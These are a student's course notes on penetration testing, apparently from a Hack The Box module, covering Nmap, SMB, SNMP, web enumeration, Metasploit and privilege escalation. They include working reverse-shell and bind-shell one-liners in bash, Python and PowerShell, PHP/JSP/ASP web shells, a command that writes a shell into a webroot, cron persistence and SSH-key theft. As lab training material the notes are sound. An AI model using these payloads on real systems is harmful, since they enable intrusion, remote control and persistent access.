# Module 2 — Overview

## Summary
- Risk assessment is a major part of penetration testing.
- Learnt a new word: **distro** — meaning Linux distributions.
- Set up and started working with **Parrot OS**.
- Importance of maintaining a proper folder structure. Organisation matters as much as technical skills.

### Example Folder Structure
TanHack24xx@htb[/htb]$ tree Projects/
Projects/

└── Acme Company      
├── EPT      
│   ├── evidence      
│   │   ├── credentials      
│   │   ├── data      
│   │   └── screenshots      
│   ├── logs      
│   ├── scans      
│   ├── scope      
│   └── tools      
└── IPT      
├── evidence      
│   ├── credentials      
│   ├── data      
│   └── screenshots      
├── logs       
├── scans      
├── scope      
└── tools      

## Summary (continued)
- Overview of VPNs. Types: **client-based** and **SSL VPN**. Learnt commands to connect to VPN.
- Revision on shells, ports, and web servers. OWASP Top 10 is extremely important — assessors always check it first.
- Basic tools introduced:
  1. **SSH** — remotely access systems securely; uses client–server model.  
     Example: `ssh bob@10.10.10.10`
  2. **Netcat** — interact with TCP/UDP ports.  
     - Connect: `nc 10.10.10.10 22`  
     - Banner grab: `nc -nv 10.129.42.253 21`
  3. **Socat** — similar to Netcat but supports port forwarding and serial device connections.
  4. **Terminal multiplexers (tmux / screen)** — multiple windows inside one terminal.  
     Install: `sudo apt install tmux -y`
  5. **Vim** — keyboard‑driven text editor.  
     Open file: `vim /etc/hosts`

- Service scanning and coercing servers into unintended actions.
- Introduction to **Nmap**:
  - Basic scan: `nmap 10.10.10.10`
  - `-sC` — run default scripts  
  - `-sV` — version scan  
  - `-p-` — scan all 65,535 TCP ports  
  - Example: `nmap -sV -sC -p- 10.129.42.253`
  - Run script: `nmap --script <script> -p<port> <host>`
  - Banner grab: `nmap -sV --script=banner <target>`

- **FTP**:
  - Nmap scan reveals installation, anonymous login, pub directory.
  - Connect: `ftp -p 10.129.42.253`
  - Commands: `cd`, `ls`, `get file.txt`, `cat file.txt`

- **SMB (Server Message Block)**:
  - Protocol on Windows; used for vertical and lateral movement.
  - Scan: `nmap --script smb-os-discovery.nse -p445 10.10.10.40`
  - Aggressive scan: `nmap -A -p445 10.129.42.253`
  - Shares:
    - List shares: `smbclient -N -L \\\\10.129.42.253`
    - Connect as guest: `smbclient \\\\10.129.42.253\\users`
    - Connect as user: `smbclient -U bob \\\\10.129.42.253\\users`

- **SNMP**:
  - Community strings provide device info. Defaults: `public`, `private`.
  - `onesixtyone` can brute‑force community strings.
  - Examples:
    - `snmpwalk -v2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0`
    - `snmpwalk -v2c -c private 10.129.42.253`
    - `onesixtyone -c dict.txt 10.129.42.254`
   
- **Web Enumeration Techniques**
1. **Gobuster**  
   - High‑performance file/directory, DNS, and virtual host brute‑forcing tool.  
   - Used to discover hidden directories and files on web servers.  
   - Simple scan example:  
     `gobuster dir -u http://10.10.10.121/ -w <wordlist>`  
   - DNS Subdomain Enumeration:  
     - Install SecLists:  
       `git clone https://github.com/danielmiessler/SecLists`  
       `sudo apt install seclists -y`  
     - Use SecLists with Gobuster:  
       `gobuster dns -d inlanefreight.com -w <seclists-wordlist>`

2. **HTTP Status Codes**  
   - 200 = successful request  
   - 403 = forbidden  
   - 301 = redirection  

3. **cURL**  
   - Retrieve server header information from the command line.  
   - Example:  
     `curl -IL https://www.inlanefreight.com`

4. **WhatWeb**  
   - Command‑line tool to extract versions of web servers, supporting frameworks, and applications.  
   - Basic usage:  
     `whatweb 10.10.10.121`  
   - Scan a whole subnet:  
     `whatweb --no-errors 10.10.10.0/24`

5. **SSL/TLS Certificate**  
   - Reveals information such as email, company name, etc.  
   - Could potentially be used for phishing if within the scope of assessment.

6. **robots.txt**  
   - Instructs search engine crawlers on which resources can or cannot be indexed.  
   - May reveal locations of private files and admin pages.

7. **Source Code Review**  
   - Using CTRL+U to view page source.  
   - Can reveal developer comments containing test credentials or plugin versions.

8. **Public Exploit Search**  
   - Next step is to look for public exploits available.  
   - Searchsploit can be used.  
     - Install: `sudo apt install exploitdb -y`  
     - Search for a specific application: `searchsploit openssh 7.2`  
   - Places to look for exploits:  
     - https://www.exploit-db.com/  
     - https://www.rapid7.com/db/  
     - https://www.vulnerability-lab.com/

9. **Metasploit Primer**  
   - Tool containing many built‑in exploits for public vulnerabilities.  
   - Run: `msfconsole`  
   - Search target application: `search exploit eternalblue`  
   - Search filters: `search cve:2009 type:exploit`  
   - Copy full module name and load it using `use`:  
     `use exploit/windows/smb/ms17_010_psexec`  
   - View configuration options: `show options`  
   - RHOSTS = target IP (single/multiple/file with list of IPs)  
   - LHOST = attack host IP (single or name of network interface)  
   - Set before exploitation:  
     `set RHOSTS 10.10.10.40`  
     `set LHOST tun0`  
   - Check server vulnerability: `check`  
   - Run/exploit: `exploit`

- One way to connect to compromised systems is through:
  - **SSH** for Linux
  - **WinRM** for Windows  
  These allow remote login.

- **Reverse Shells**:
  - Used after identifying a vulnerability.
  - Characteristics: Quick, Reliable, Fragile — if the connection is lost, the exploit must be run again.
  - Start a Netcat listener on our port:  
    `nc -lvnp 1234`
  - Flags:
    - `-l` — Listen mode, to wait for a connection.
    - `-v` — Verbose mode, so we know when a connection is received.
    - `-n` — Disable DNS resolution for faster connections.
    - `-p 1234` — Port number Netcat listens on.
  - Connect‑back IP:
    - `ip a`  
    - `tun0` for HTB  
    - `eth0` for real scenarios
  - Reliable reverse connection for bash:
    - `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`
    - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f`
  - Reliable reverse connection for PowerShell:
    - `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"`

- **Bind Shells** (we connect to it):
  - Listens on port 1234 with IP `0.0.0.0` — connect from anywhere.
  - Start bind shell:
    - Bash:  
      `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f`
    - Python:  
      `python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`
    - PowerShell:  
      `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();`
  - Connect to bind shell:  
    `nc 10.10.10.1 1234`

- **Upgrade TTY in Netcat Shell**:
  1. `python -c 'import pty; pty.spawn("/bin/bash")'`
  2. Press `Ctrl + Z`
  3. `stty raw -echo`
  4. `fg`
  5. Press Enter (or type `reset` then Enter)
  6. Get terminal variables:
     - `echo $TERM`
     - `stty size`
  7. Apply terminal settings:
     - `export TERM=xterm-256color`
     - `stty rows 67 columns 318`

- **Web Shells (PHP, ASPX, JSP)**:
  - Use HTTP request parameters like GET or POST.
  - PHP web shell:  
    `<?php system($_REQUEST["cmd"]); ?>`
  - JSP web shell:  
    `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
  - ASP web shell:  
    `<% eval request("cmd") %>`

- **Uploading a Web Shell**:
  1. Identify the webroot:

     | Web Server | Default Webroot |
     |------------|-----------------|
     | Apache     | /var/www/html/  |
     | Nginx      | /usr/local/nginx/html/ |
     | IIS        | c:\inetpub\wwwroot\ |
     | XAMPP      | C:\xampp\htdocs\ |

  2. Write the web shell using echo:  
     `echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php`

- **Accessing the Web Shell**:
  - Browser:  
    `http://SERVER_IP:PORT/shell.php?cmd=id`
  - cURL:  
    `curl http://SERVER_IP:PORT/shell.php?cmd=id`

  - **Benefits**:
    - Can bypass firewalls.
    - If the compromised host reboots, the web shell remains.
    - Accessible anytime as long as the file stays in place.

- **Privilege Escalation**:
  - Linux script from PEASS called LinPEAS: `./linpeas.sh`
  - Server running old OS — look for kernel vulnerabilities.
  - Kernel exploits cause system instability — needs great care before running on production systems.
  - Look for vulnerable installed software:
    - Linux: `dpkg -l`
    - Windows: look at `C:\Program Files`
  - Check sudo privileges: `sudo -l`
    - `(ALL : ALL) ALL` — run all commands with sudo.
    - `(user : user) NOPASSWD: /bin/echo` — `/bin/echo` can be executed without a password; `user` means we can run sudo as that user and not as root.
  - Switch to root user: `sudo su -`
  - Run command as another user: `sudo -u user /bin/echo Hello World!`
  - Take advantage of scheduled tasks:
    - Add new scheduled tasks/cron jobs (write with reverse shell):
      - `/etc/crontab`
      - `/etc/cron.d`
      - `/var/spool/cron/crontabs/root`
    - Trick them into executing malicious software.
  - Exposed credentials — look in: configuration files, log files, `bash_history` (Linux), `PSReadLine` (Windows).
  - SSH Keys:
    - With read access, find private SSH keys at `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`
    - Read the `/root/.ssh/` directory.
    - Read the `id_rsa` file.
    - Copy: `vim id_rsa`
    - Change file permissions: `chmod 600 id_rsa`
    - Login: `ssh root@10.10.10.10 -i id_rsa`
    - With write access to user's `/.ssh/` directory — place public key at `/home/user/.ssh/authorized_keys`.
    - Create new key and specify output file: `ssh-keygen -f key`
    - Copy `key.pub` to remote machine then append: `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`
    - Login with private key: `ssh root@10.10.10.10 -i key`
      
## Key Concepts
- Linux systems & utility tools  
- SSH  
- Netcat  
- Banner grabbing  
- Nmap  
- FTP  
- SMB
- Web Enumeration Techniques: Gobuster, HTTP status codes, cURL, WhatWeb, SSL/TLS certificate, robots.txt, source code.
- Public exploit discovery and validation.
- Using Metasploit for vulnerability assessment.
- Shell access methods (reverse, bind, web shells)
- Improving shell usability (TTY upgrades)
- Privilege escalation through OS and kernel exploits
- Exposing credentials and SSH keys

